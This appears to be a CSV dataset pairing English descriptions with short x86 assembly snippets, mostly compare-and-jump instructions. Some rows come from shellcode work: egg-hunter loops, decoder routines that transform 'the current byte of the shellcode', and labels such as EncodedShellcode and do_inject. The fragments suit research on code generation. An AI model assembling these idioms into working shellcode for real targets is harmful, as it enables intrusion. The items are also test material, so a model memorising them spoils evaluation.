jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7,jump var0 label if byte starting address contained var1 register lower byte value var2,"cmp BYTE [esi] , 0x7 \n jl lowbound","cmp BYTE [var1] , var2 \n jl var0"
if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label,if byte starting address contained var0 register lower byte value var1 then jump var2 label,"cmp BYTE [esi] , 0x7 \n jl lowbound","cmp BYTE [var0] , var1 \n jl var2"
if the byte starting at the address contained in the esi register is lower than the byte value 0x7 then jump to the lowbound label else subtract the byte value 0x7 from byte starting at the address contained in the esi register,if byte starting address contained var0 register lower byte value var2 then jump var3 label else subtract byte value var2 byte starting address contained var0 register,"cmp BYTE [esi] , 0x7 \n jl lowbound \n sub BYTE [esi] , 0x7","cmp BYTE [var0] , var2 \n jl var3 \n sub BYTE [var0] , var2"
jump to the lowbound label if the byte starting at the address contained in the esi register is lower than the byte value 0x7 else subtract the byte value 0x7 from byte starting at the address contained in the esi register,jump var0 label if byte starting address contained var1 register lower byte value var3 else subtract byte value var3 byte starting address contained var1 register,"cmp BYTE [esi] , 0x7 \n jl lowbound \n sub BYTE [esi] , 0x7","cmp BYTE [var1] , var3 \n jl var0 \n sub BYTE [var1] , var3"
jump to the lowbound label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0x7,jump var0 label if byte starting address contained var1 register lower or equal byte value var2,"cmp BYTE [esi] , 0x7 \n jle lowbound","cmp BYTE [var1] , var2 \n jle var0"
compare the byte at the address esi and 0xd,compare byte address var0 and var1,"cmp byte [esi] , 0xd","cmp byte [var0] , var1"
jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD,jump var0 label if byte starting address contained var1 register lower byte value 0xD,"cmp byte [esi] , 0xD \n jl wrap_around","cmp byte [var1] , 0xD \n jl var0"
if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label,if byte starting address contained var0 register lower byte value 0xD then jump var1 label,"cmp byte [esi] , 0xD \n jl wrap_around","cmp byte [var0] , 0xD \n jl var1"
jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than the byte value 0xD else subtract the byte value 0xD from byte starting at the address contained in the esi register,jump var0 label if byte starting address contained var1 register lower byte value 0xD else subtract byte value 0xD byte starting address contained var1 register,"cmp byte [esi] , 0xD \n jl wrap_around \n sub byte [esi] , 0xD","cmp byte [var1] , 0xD \n jl var0 \n sub byte [var1] , 0xD"
if the byte starting at the address contained in the esi register is lower than the byte value 0xD then jump to the wrap_around label else subtract the byte value 0xD from byte starting at the address contained in the esi register,if byte starting address contained var0 register lower byte value 0xD then jump var2 label else subtract byte value 0xD byte starting address contained var0 register,"cmp byte [esi] , 0xD \n jl wrap_around \n sub byte [esi] , 0xD","cmp byte [var0] , 0xD \n jl var2 \n sub byte [var0] , 0xD"
jump to the wrap_around label if the byte starting at the address contained in the esi register is lower than or equal to the byte value 0xD,jump var0 label if byte starting address contained var1 register lower or equal byte value 0xD,"cmp byte [esi] , 0xD \n jle wrap_around","cmp byte [var1] , 0xD \n jle var0"
jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register,jump label var0 if byte representation 2 equal contents al register,"cmp BYTE al , 2 \n je do_inject","cmp BYTE al , 2 \n je var0"
if the byte representation of 2 is equal to the contents of the al register then jump to the label do_inject,if byte representation 2 equal contents al register then jump label var0,"cmp BYTE al , 2 \n je do_inject","cmp BYTE al , 2 \n je var0"
jump to the label do_inject if the byte representation of 2 is equal to the contents of the al register else jump to the while label,jump label var0 if byte representation 2 equal contents al register else jump while label,"cmp BYTE al , 2 \n je do_inject \n jmp while","cmp BYTE al , 2 \n je var0 \n jmp while"
if the byte representation of 2 is equal to the contents of the al register else jump to the while label then jump to the label do_inject,if byte representation 2 equal contents al register else jump while label then jump label var0,"cmp BYTE al , 2 \n je do_inject \n jmp while","cmp BYTE al , 2 \n je var0 \n jmp while"
if the first byte of the esi register is not equal to the contents of the bl register then jump to the label loop_1,if first byte var0 register not equal contents var1 register then jump label var2,"cmp BYTE bl , [esi] \n jne loop_1","cmp BYTE var1 , [var0] \n jne var2"
jump to the memory address 0xff if the unsigned contents of the cl register is lower than the unsigned value 0x11 else add the 0x5 value to the dl register,jump memory address var0 if unsigned contents cl register lower unsigned value var1 else add 0x5 value dl register,"cmp cl , 0x11 \n jb 0xff \n add dl , 0x5","cmp cl , var1 \n jb var0 \n add dl , 0x5"
if the unsigned contents of the cl register is lower than the unsigned value 0x11 then jump to the memory address 0xff else add the 0x5 value to the dl register,if unsigned contents cl register lower unsigned value var0 then jump memory address var1 else add 0x5 value dl register,"cmp cl , 0x11 \n jb 0xff \n add dl , 0x5","cmp cl , var0 \n jb var1 \n add dl , 0x5"
jump to the loop label if the contents of the cl register is not equal to the value 0x3,jump loop label if contents cl register not equal value var0,"cmp cl , 0x3 \n jne loop","cmp cl , var0 \n jne loop"
if the contents of the cl register is not equal to the value 0x3 then jump to the loop label,if contents cl register not equal value var0 then jump loop label,"cmp cl , 0x3 \n jne loop","cmp cl , var0 \n jne loop"
jump to the loop2 label if the contents of the cl register is not equal to the value 0x3,jump var0 label if contents cl register not equal value var1,"cmp cl , 0x3 \n jne loop2","cmp cl , var1 \n jne var0"
if the contents of the cl register is not equal to the value 0x3 then jump to the loop2 label,if contents cl register not equal value var0 then jump var1 label,"cmp cl , 0x3 \n jne loop2","cmp cl , var0 \n jne var1"
jump to the label l2 if the contents of the cl register is greater than the decimal value 12,jump label var0 if contents cl register greater decimal value 12,"cmp cl , 12 \n jg l2","cmp cl , 12 \n jg var0"
if the contents of the cl register is greater than the decimal value 12 then jump to the label l2,if contents cl register greater decimal value 12 then jump label var0,"cmp cl , 12 \n jg l2","cmp cl , 12 \n jg var0"
jump to the label l2 if the contents of the cl register is greater than or equal to the decimal value 12,jump label var0 if contents cl register greater or equal decimal value 12,"cmp cl , 12 \n jge l2","cmp cl , 12 \n jge var0"
if the contents of the cl register is greater than or equal to the decimal value 12 then jump to the label l2,if contents cl register greater or equal decimal value 12 then jump label var0,"cmp cl , 12 \n jge l2","cmp cl , 12 \n jge var0"
jump to the label l3 if the unsigned contents of the cl register is lower than the unsigned contents of the dl register,jump label var0 if unsigned contents cl register lower unsigned contents dl register,"cmp cl , dl \n jb l3","cmp cl , dl \n jb var0"
if the unsigned contents of the cl register is lower than the unsigned contents of the dl register then jump to the label l3,if unsigned contents cl register lower unsigned contents dl register then jump label var0,"cmp cl , dl \n jb l3","cmp cl , dl \n jb var0"
jump to the EncodedShellcode label if the contents of the cl register is equal to the contents of the dl register,jump var0 label if contents cl register equal contents dl register,"cmp cl , dl \n je EncodedShellcode","cmp cl , dl \n je var0"
if the contents of the cl register is equal to the contents of the dl register then jump to the EncodedShellcode label,if contents cl register equal contents dl register then jump var0 label,"cmp cl , dl \n je EncodedShellcode","cmp cl , dl \n je var0"
jump to the init label if the contents of the cl register is equal to the contents of the dl register else increment the contents of the cl register,jump var0 label if contents cl register equal contents dl register else increment contents cl register,"cmp cl , dl \n je init \n inc cl","cmp cl , dl \n je var0 \n inc cl"
if the contents of the cl register is equal to the contents of the dl register then jump to the init label else increment the contents of the cl register,if contents cl register equal contents dl register then jump var0 label else increment contents cl register,"cmp cl , dl \n je init \n inc cl","cmp cl , dl \n je var0 \n inc cl"
jump to the exit label if the contents of the dl register is equal to the vale 1 else jump to the reading label,jump exit label if contents dl register equal vale 1 else jump reading label,"cmp dl , 1 \n je exit \n jmp reading","cmp dl , 1 \n je exit \n jmp reading"
if the contents of the dl register is equal to the vale 1 then jump to the exit label else jump to the reading label,if contents dl register equal vale 1 then jump exit label else jump reading label,"cmp dl , 1 \n je exit \n jmp reading","cmp dl , 1 \n je exit \n jmp reading"
compare the contents of the dl register and 1h,compare contents dl register and 1h,"cmp dl , 1h","cmp dl , 1h"
if the contents of the dl register is greater than the decimal value 27 then jump to the label l3,if contents dl register greater decimal value 27 then jump label var0,"cmp dl , 27 \n jg l3","cmp dl , 27 \n jg var0"
jump to the label l3 if the contents of the dl register is greater than the decimal value 27,jump label var0 if contents dl register greater decimal value 27,"cmp dl , 27 \n jg l3","cmp dl , 27 \n jg var0"
jump to the label l3 if the contents of the dl register is greater than or equal to the decimal value 27,jump label var0 if contents dl register greater or equal decimal value 27,"cmp dl , 27 \n jge l3","cmp dl , 27 \n jge var0"
if the contents of the dl register is greater than or equal to the decimal value 27 then jump to the label l3,if contents dl register greater or equal decimal value 27 then jump label var0,"cmp dl , 27 \n jge l3","cmp dl , 27 \n jge var0"
jump to the label l1 if the unsigned contents of the dl register is lower than the unsigned contents of the cl register else move the value 0x39 to the al register,jump label var0 if unsigned contents dl register lower unsigned contents cl register else move value var1 al register,"cmp dl , cl \n jb l1 \n mov al , 0x39","cmp dl , cl \n jb var0 \n mov al , var1"
if the unsigned contents of the dl register is lower than the unsigned contents of the cl register then jump to the label l1 else move the value 0x39 to the al register,if unsigned contents dl register lower unsigned contents cl register then jump label var0 else move value var1 al register,"cmp dl , cl \n jb l1 \n mov al , 0x39","cmp dl , cl \n jb var0 \n mov al , var1"
compare the dword at the address [eax-4] and egg1,compare the dword at the address [eax-4] and egg1,"cmp dword [eax-4] , egg1","cmp dword [eax-4] , egg1"
jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register,jump to the _next label if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address else jump to the eax register,"cmp dword [eax-4] , egg1 \n jne _next \n jmp eax","cmp dword [eax-4] , egg1 \n jne _next \n jmp eax"
if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register,if the doubleword starting at the address [eax-4] is not equal to the contents stored at the egg1 address then jump to the _next label else jump to the eax register,"cmp dword [eax-4] , egg1 \n jne _next \n jmp eax","cmp dword [eax-4] , egg1 \n jne _next \n jmp eax"
jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register,jump to the _next label if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address else jump to the eax register,"cmp dword [eax-4] , egg2 \n je _next \n jmp eax","cmp dword [eax-4] , egg2 \n je _next \n jmp eax"
if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register,if the doubleword starting at the address [eax-4] is equal to the contents stored at the egg2 address then jump to the _next label else jump to the eax register,"cmp dword [eax-4] , egg2 \n je _next \n jmp eax","cmp dword [eax-4] , egg2 \n je _next \n jmp eax"
compare the dword at the memory location [eax-4] with the value of egg1,compare the dword at the memory location [eax-4] with the value of egg1,"cmp dword [eax-4] , egg1","cmp dword [eax-4] , egg1"
compare the dword at the address [eax-8] and egg,compare the dword at the address [eax-8] and egg,"cmp dword [eax-8] , egg","cmp dword [eax-8] , egg"
jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address,jump to the _next label if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address,"cmp dword [eax-8] , egg \n jne _next","cmp dword [eax-8] , egg \n jne _next"
if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label,if the doubleword starting at the address [eax-8] is not equal to the contents stored at the egg address then jump to the _next label,"cmp dword [eax-8] , egg \n jne _next","cmp dword [eax-8] , egg \n jne _next"
compare the dword at the memory location [eax-8] with the value of egg,compare the dword at the memory location [eax-8] with the value of egg,"cmp dword [eax-8] , egg","cmp dword [eax-8] , egg"
jump to the jne _start label if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 else jump to the eax register,jump var0 var1 label if doubleword starting address contained var2 register not equal doubleword value var4 else jump var2 register,"cmp DWORD [eax] , 0x4f904790 \n jne _start \n jmp eax","cmp DWORD [var2] , var4 \n var0 var1 \n jmp var2"
if the doubleword starting at the address contained in the eax register is not equal to the doubleword value 0x4f904790 then jump to the jne _start label else jump to the eax register,if doubleword starting address contained var0 register not equal doubleword value var2 then jump var3 var4 label else jump var0 register,"cmp DWORD [eax] , 0x4f904790 \n jne _start \n jmp eax","cmp DWORD [var0] , var2 \n var3 var4 \n jmp var0"
compare the dword at the address [eax] and the contents of the ebx register,compare the dword at the address [eax] and the contents of the ebx register,"cmp dword [eax] , ebx","cmp dword [eax] , ebx"
jump to the next_address label if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster else jump to the eax register,jump var0 label if doubleword starting address contained var1 register not equal contents var3 var4 else jump var1 register,"cmp dword [eax] , ebx \n jne next_addr \n jmp eax","cmp dword [var1] , var3 \n jne next_addr \n jmp var1"
if the doubleword starting at the address contained in the eax register is not equal to the contents of the ebx regoster then jump to the next_address label else jump to the eax register,if doubleword starting address contained var0 register not equal contents var2 var3 then jump var4 label else jump var0 register,"cmp dword [eax] , ebx \n jne next_addr \n jmp eax","cmp dword [var0] , var2 \n jne next_addr \n jmp var0"
jump to the loop label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register,jump loop label if doubleword starting address contained var0 register not equal contents var2 register else jump var0 register,"cmp DWORD [eax] , edx \n jne loop \n jmp eax","cmp DWORD [var0] , var2 \n jne loop \n jmp var0"
if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the loop label else jump to the eax register,if doubleword starting address contained var0 register not equal contents var2 register then jump loop label else jump var0 register,"cmp DWORD [eax] , edx \n jne loop \n jmp eax","cmp DWORD [var0] , var2 \n jne loop \n jmp var0"
jump to the while label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register,jump while label if doubleword starting address contained var0 register not equal contents var2 register else jump var0 register,"cmp DWORD [eax] , edx \n jne search_the_egg \n jmp eax","cmp DWORD [var0] , var2 \n jne search_the_egg \n jmp var0"
jump to the search_the_egg label if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register else jump to the eax register,jump var0 label if doubleword starting address contained var1 register not equal contents var3 register else jump var1 register,"cmp DWORD [eax] , edx \n jne search_the_egg \n jmp eax","cmp DWORD [var1] , var3 \n jne var0 \n jmp var1"
if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the while label else jump to the eax register,if doubleword starting address contained var0 register not equal contents var2 register then jump while label else jump var0 register,"cmp DWORD [eax] , edx \n jne search_the_egg \n jmp eax","cmp DWORD [var0] , var2 \n jne search_the_egg \n jmp var0"
if the doubleword starting at the address contained in the eax register is not equal to the contents of the edx register then jump to the search_the_egg label else jump to the eax register,if doubleword starting address contained var0 register not equal contents var2 register then jump var3 label else jump var0 register,"cmp DWORD [eax] , edx \n jne search_the_egg \n jmp eax","cmp DWORD [var0] , var2 \n jne var3 \n jmp var0"
jump to the while label if the doubleword starting at the address contained in the edx register is equal to the doubleword value 0x636f7270,jump while label if doubleword starting address contained var0 register equal doubleword value var1,"cmp DWORD [edx] , 0x636f7270 \n je while","cmp DWORD [var0] , var1 \n je while"
compare the doubleword stored at memory location var to the integer value 10,compare doubleword stored memory location var integer value 10,"cmp dword [var] , 10","cmp dword [var] , 10"
compare the dx value with zero,compare var0 value zero,"cmp dx , 00","cmp var0 , 00"
jump to the L1 label if the contents of the dx register is equal to the value 0x03e8,jump var0 label if contents var1 register equal value var2,"cmp dx , 0x03e8 \n je L1","cmp var1 , var2 \n je var0"
if the contents of the dx register is equal to the value 0x03e8 then jump to the L1 label,if contents var0 register equal value var1 then jump var3 label,"cmp dx , 0x03e8 \n je L1","cmp var0 , var1 \n je var3"
compare eax to zero,compare var0 zero,"cmp eax , 0","cmp var0 , 0"
compare if eax is equal to 0,compare if var0 equal 0,"cmp eax , 0","cmp var0 , 0"
compare if eax is zero,compare if var0 zero,"cmp eax , 0","cmp var0 , 0"
compare the contents of eax and the contents of eax,compare contents var0 and contents var0,"cmp eax , eax","cmp var0 , var0"
jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register,jump memory address var0 if contents var1 register not equal contents var1 register,"cmp eax , eax \n jne 0x8","cmp var1 , var1 \n jne var0"
if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8,if contents var0 register not equal contents var0 register then jump memory address var2,"cmp eax , eax \n jne 0x8","cmp var0 , var0 \n jne var2"
jump to the memory address 0x8 if the contents of the eax register is not equal to the contents of the eax register else zero out the eax register,jump memory address var0 if contents var1 register not equal contents var1 register else zero out var1 register,"cmp eax , eax \n jne 0x8 \n xor eax , eax","cmp var1 , var1 \n jne var0 \n xor var1 , var1"
if the contents of the eax register is not equal to the contents of the eax register then jump to the memory address 0x8 else zero out the eax register,if contents var0 register not equal contents var0 register then jump memory address var3 else zero out var0 register,"cmp eax , eax \n jne 0x8 \n xor eax , eax","cmp var0 , var0 \n jne var3 \n xor var0 , var0"
jump short to the memory location loc_40102B if the contents of the eax register is not equal to the contents of the ebp register,jump short memory location var0 if contents var1 register not equal contents var2 register,"cmp eax , ebp \n jnz short loc_40102B","cmp var1 , var2 \n jnz short var0"
if the contents of the eax register is not equal to the contents of the ebp register then jump short to the memory location loc_40102B,if contents var0 register not equal contents var1 register then jump short memory location var2,"cmp eax , ebp \n jnz short loc_40102B","cmp var0 , var1 \n jnz short var2"
compare eax with ebx,compare var0 var1,"cmp eax , ebx","cmp var0 , var1"
compare the contents of eax and the contents of ebx,compare contents var0 and contents var1,"cmp eax , ebx","cmp var0 , var1"
compare the contents of the eax register and the contents of the ebx register,compare contents var0 register and contents var1 register,"cmp eax , ebx","cmp var0 , var1"
jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register,jump memory address var0 if contents var1 register equal contents var2 register,"cmp eax , ebx \n je 0x47","cmp var1 , ebx \n je var0"
if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47,if contents var0 register equal contents var1 register then jump memory address var2,"cmp eax , ebx \n je 0x47","cmp var0 , ebx \n je var2"
if the contents of the eax register is equal to the contents of the edi register then jump to the memory address 0x47 else zero out the ecx register,if contents var0 register equal contents var1 register then jump memory address var2 else zero out var3 register,"cmp eax , ebx \n je 0x47 \n xor ecx , ecx","cmp var0 , ebx \n je var2 \n xor var3 , var3"
jump to the memory address 0x47 if the contents of the eax register is equal to the contents of the edi register else zero out the ecx register,jump memory address var0 if contents var1 register equal contents var2 register else zero out var3 register,"cmp eax , ebx \n je 0x47 \n xor ecx , ecx","cmp var1 , ebx \n je var0 \n xor var3 , var3"
jump to the all label if the contents of the eax register is equal to the contents of the ebx register,jump all label if contents var0 register equal contents var1 register,"cmp eax , ebx \n je all","cmp var0 , var1 \n je all"
if the contents of the eax register is equal to the contents of the ebx register then jump to the all label,if contents var0 register equal contents var1 register then jump all label,"cmp eax , ebx \n je all","cmp var0 , var1 \n je all"
jump to the all label if the contents of the eax register is equal to the contents of the ebx register else zero out the eax register,jump all label if contents var0 register equal contents var2 register else zero out var0 register,"cmp eax , ebx \n je all \n xor eax , eax","cmp var0 , var2 \n je all \n xor var0 , var0"
if the contents of the eax register is equal to the contents of the ebx register then jump to the all label else zero out the eax register,if contents var0 register equal contents var2 register then jump all label else zero out var0 register,"cmp eax , ebx \n je all \n xor eax , eax","cmp var0 , var2 \n je all \n xor var0 , var0"
jump to the child label if the contents of the eax register is equal to the contents of the ebx register,jump child label if contents var0 register equal contents var1 register,"cmp eax , ebx \n je child","cmp var0 , var1 \n je child"
if the contents of the eax register is equal to the contents of the ebx register then jump to the child label,if contents var0 register equal contents var1 register then jump child label,"cmp eax , ebx \n je child","cmp var0 , var1 \n je child"
jump to the connect label if the contents of the eax register is equal to the contents of the ebx register else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register,jump connect label if contents var0 register equal contents var2 register else jump exit label if unsigned contents var0 register greater unsigned contents var2 register,"cmp eax , ebx \n je connect \n ja exit","cmp var0 , var2 \n je connect \n ja exit"
if the contents of the eax register is equal to the contents of the ebx register then jump to the connect label else jump to the exit label if the unsigned contents of the eax register is greater than the unsigned contents of the ebx register,if contents var0 register equal contents var2 register then jump connect label else jump exit label if unsigned contents var0 register greater unsigned contents var2 register,"cmp eax , ebx \n je connect \n ja exit","cmp var0 , var2 \n je connect \n ja exit"
if the contents of the eax register is equal to the contents of the ebx register then jump to the download label,if contents var0 register equal contents var1 register then jump download label,"cmp eax , ebx \n je download","cmp var0 , var1 \n je download"
jump to the download label if the contents of the eax register is equal to the contents of the ebx register,jump download label if contents var0 register equal contents var1 register,"cmp eax , ebx \n je download","cmp var0 , var1 \n je download"
if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label,if contents var0 register equal contents var1 register then jump exit label,"cmp eax , ebx \n je exit","cmp var0 , var1 \n je exit"
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register,jump exit label if contents var0 register equal contents var1 register,"cmp eax , ebx \n je exit","cmp var0 , var1 \n je exit"
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x3 into the al register,jump exit label if contents var0 register equal contents var1 register else move value var2 al register,"cmp eax , ebx \n je exit \n add al , 0x3","cmp var0 , var1 \n je exit \n add al , var2"
if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x3 into the al register,if contents var0 register equal contents var1 register then jump exit label else move value var2 al register,"cmp eax , ebx \n je exit \n add al , 0x3","cmp var0 , var1 \n je exit \n add al , var2"
jump to the exit label if the contents of the eax register is equal to the contents of the ebx register else move the value 0x4 into the al register,jump exit label if contents var0 register equal contents var1 register else move value var2 al register,"cmp eax , ebx \n je exit \n mov al , 0x4","cmp var0 , var1 \n je exit \n mov al , var2"
if the contents of the eax register is equal to the contents of the ebx register then jump to the exit label else move the value 0x4 into the al register,if contents var0 register equal contents var1 register then jump exit label else move value var2 al register,"cmp eax , ebx \n je exit \n mov al , 0x4","cmp var0 , var1 \n je exit \n mov al , var2"
jump to the L1 label if the contents of the eax register is equal to the contents of the ebx register,jump var0 label if contents var1 register equal contents var2 register,"cmp eax , ebx \n je L1","cmp var1 , var2 \n je var0"
if the contents of the eax register is equal to the contents of the ebx register then jump to the L1 label,if contents var0 register equal contents var1 register then jump var2 label,"cmp eax , ebx \n je L1","cmp var0 , var1 \n je var2"
jump to the retry label if the contents of the eax register is not equal to the contents of the ebx register,jump retry label if contents var0 register not equal contents var1 register,"cmp eax , ebx \n jne retry","cmp var0 , var1 \n jne retry"
if the contents of the eax register is not equal to the contents of the ebx register then jump to the retry label,if contents var0 register not equal contents var1 register then jump retry label,"cmp eax , ebx \n jne retry","cmp var0 , var1 \n jne retry"
jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register,jump infinite label if contents var0 register not equal contents var1 register,"cmp eax , edi \n jne infinite","cmp var0 , var1 \n jne infinite"
if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label,if contents var0 register not equal contents var1 register then jump infinite label,"cmp eax , edi \n jne infinite","cmp var0 , var1 \n jne infinite"
jump to the infinite label if the contents of the eax register is not equal to the contents of the edi register else zero out the eax register,jump infinite label if contents var0 register not equal contents var2 register else zero out var0 register,"cmp eax , edi \n jne infinite \n xor eax , eax","cmp var0 , var2 \n jne infinite \n xor var0 , var0"
if the contents of the eax register is not equal to the contents of the edi register then jump to the infinite label else zero out the eax register,if contents var0 register not equal contents var2 register then jump infinite label else zero out var0 register,"cmp eax , edi \n jne infinite \n xor eax , eax","cmp var0 , var2 \n jne infinite \n xor var0 , var0"
compare the contents of eax with ebx,compare contents var0 var1,"cmp eax , ebx","cmp var0 , var1"
compare the contents of the ebp register with the value 0,compare contents var0 register value 0,"cmp ebp , 0","cmp var0 , 0"
compare if ebx is zero,compare if var0 zero,"cmp ebx , 0","cmp var0 , 0"
jump to the exit label if the unsigned contents of the ebx register is greater than the unsigned value 10 else jump to the loop label,jump exit label if unsigned contents var0 register greater unsigned value 10 else jump loop label,"cmp ebx , 9 \n ja exit \n jmp loop","cmp var0 , 9 \n ja exit \n jmp loop"
if the unsigned contents of the ebx register is greater than the unsigned value 10 then jump to the exit label else jump to the loop label,if unsigned contents var0 register greater unsigned value 10 then jump exit label else jump loop label,"cmp ebx , 9 \n ja exit \n jmp loop","cmp var0 , 9 \n ja exit \n jmp loop"
compare ecx to 0,compare var0 0,"cmp ecx , 0","cmp var0 , 0"
compare if ecx is zero,compare if var0 zero,"cmp ecx , 0","cmp var0 , 0"
compare ecx with 0h,compare var0 0h,"cmp ecx , 0h","cmp var0 , 0h"
compare if ecx is equal to 10,compare if var0 equal 10,"cmp ecx , 10","cmp var0 , 10"
compare if ecx is equal to 100,compare if var0 equal 100,"cmp ecx , 100","cmp var0 , 100"
compare if our counter is equal to 100,compare if our counter equal 100,"cmp ecx , 100","cmp ecx , 100"
compare ecx with 5,compare var0 5,"cmp ecx , 5","cmp var0 , 5"
compare ecx and ebp,compare var0 and var1,"cmp ecx , ebp","cmp var0 , var1"
compare the contents of the ecx register with the contents of the ebp register,compare contents var0 register contents var1 register,"cmp ecx , ebp","cmp var0 , var1"
jump to the l1 label if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register,jump var0 label if unsigned contents var1 register greater unsigned contents var2 register,"cmp ecx , edx \n ja l1","cmp var1 , var2 \n ja var0"
if the unsigned contents of the ecx register is greater than the unsigned contents of the edx register then jump to the l1 label else,if unsigned contents var0 register greater unsigned contents var1 register then jump var2 label else,"cmp ecx , edx \n ja l1","cmp var0 , var1 \n ja var2"
compare if edi is equal to 0,compare if var0 equal 0,"cmp edi , 0","cmp var0 , 0"
compare if edx is zero,compare if var0 zero,"cmp edx , 0","cmp var0 , 0"
jump to the loop label if the unsigned contents of the edx register is greater than the unsigned value 0x43 else push the contents of the edx register onto the stack,jump loop label if unsigned contents var0 register greater unsigned value var2 else push contents var0 register stack,"cmp edx , 0x43 \n ja loop \n push edx","cmp var0 , var2 \n ja loop \n push var0"
if the unsigned contents of the edx register is greater than the unsigned value 0x43 then jump to the loop label else push the contents of the edx register onto the stack,if unsigned contents var0 register greater unsigned value var2 then jump loop label else push contents var0 register stack,"cmp edx , 0x43 \n ja loop \n push edx","cmp var0 , var2 \n ja loop \n push var0"
compare whether the edx register has reached 10,compare var0 var1 register has reached 10,"cmp edx , 10","cmp var1 , 10"
compare the contents of edx to 42,compare contents var0 42,"cmp edx , 42","cmp var0 , 42"
jump to loc_402B13 if the contents of the edx register is equal to 42,jump var0 if contents var1 register equal 42,"cmp edx , 42 \n je short loc_402B13","cmp var1 , 42 \n je short var0"
if the contents of the edx register is equal to 42 then jump to loc_402B13,if contents var0 register equal 42 then jump var1,"cmp edx , 42 \n je short loc_402B13","cmp var0 , 42 \n je short var1"
compare the contents of edx and the contents of ebx,compare contents var0 and contents var1,"cmp edx , ebx","cmp var0 , var1"
jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register,jump memory address var0 if contents var1 register equal contents var2 register,"cmp edx , ebx \n je 0x8 \n","cmp var1 , var2 \n je var0 \n"
if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8,if contents var0 register equal contents var1 register then jump memory address var2,"cmp edx , ebx \n je 0x8 \n","cmp var0 , var1 \n je var2 \n"
jump to the memory address 0x8 if the contents of the edx register is equal to the contents of the ebx register else move the contents of the edx register into the ebx register,jump memory address var0 if contents var1 register equal contents var3 register else move contents var1 register var3 register,"cmp edx , ebx \n je 0x8 \n mov ebx , edx","cmp var1 , var3 \n je var0 \n mov var3 , var1"
if the contents of the edx register is equal to the contents of the ebx register then jump to the memory address 0x8 else move the contents of the edx register into the ebx register,if contents var0 register equal contents var2 register then jump memory address var4 else move contents var0 register var2 register,"cmp edx , ebx \n je 0x8 \n mov ebx , edx","cmp var0 , var2 \n je var4 \n mov var2 , var0"
compare if esi is equal to 10,compare if var0 equal 10,"cmp esi , 10","cmp var0 , 10"
jump to the find_egg label if the contents of the esi register is equal to the contents of the edx register,jump var0 label if contents var1 register equal contents var2 register,"cmp esi , edx \n je find_egg","cmp var1 , var2 \n je var0"
compare the word at the address ecx and 0x5951,compare word address var0 and var1,"cmp word [ecx] , 0x5951","cmp word [var0] , var1"
define the code label,define code label,code :,code :
define connect function,define var0 function,connect :,var0 :
define the cont label,define var0 label,cont :,var0 :
define a string db and initialize to 'hello world!',define string db and initialize var0,"contents db 'hello world!' , 0h","contents db var0 , 0h"
declare the createfile label,declare var0 label,createfile :,var0 :
define createfile function,define var0 function,createfile :,var0 :
declare the cycle label,declare cycle label,cycle :,cycle :
declare D1 and move the current byte of the shellcode in the cl register,declare var0 and move current byte shellcode cl register,"D1 : \n mov cl , byte [esi]","var0 : \n mov cl , byte [esi]"
declare D1 and move the current byte of the shellcode in the dl register,declare var0 and move current byte shellcode dl register,"D1 : \n mov dl , byte [esi]","var0 : \n mov dl , byte [esi]"
in D1 save the shellcode in esi and move it to edi,in var0 save shellcode var1 and move it var2,"D1 : \n pop esi \n mov edi , esi","var0 : \n pop var1 \n mov var2 , var1"
define the function D2 and negate the byte in esi,define function var0 and negate byte var1,D2 : \n not byte [esi],var0 : \n not byte [var1]
declare the function D2 and negate the current byte of the shellcode,declare function var0 and negate current byte shellcode,D2 : \n not byte [esi],var0 : \n not byte [esi]
define D2 save the in esi the pointer to the shellcode and move esi into edi,define var0 save var1 pointer shellcode and move var1 var3,"D2 : \n pop esi \n mov edi , esi","var0 : \n pop var1 \n mov var3 , var1"
declare the ruotine D3 and add the value 5 to the current byte of the shellcode,declare var0 var1 and add value 5 current byte shellcode,"D3 : \n add byte [esi] , 5","var1 : \n add byte [esi] , 5"
"declare the function D3, store the shellcode in edi and move the pointer into esi",declare function var0 store shellcode var1 and move pointer var2,"D3 : \n pop esi \n mov edi , esi","var0 : \n pop var2 \n mov var1 , var2"
define the function D4 and perform the xor operation between the byte in esi and the 0x1 value,define function var0 and perform xor operation byte var1 and var2 value,"D4 : \n xor byte [esi] , 0x1","var0 : \n xor byte [var1] , var2"
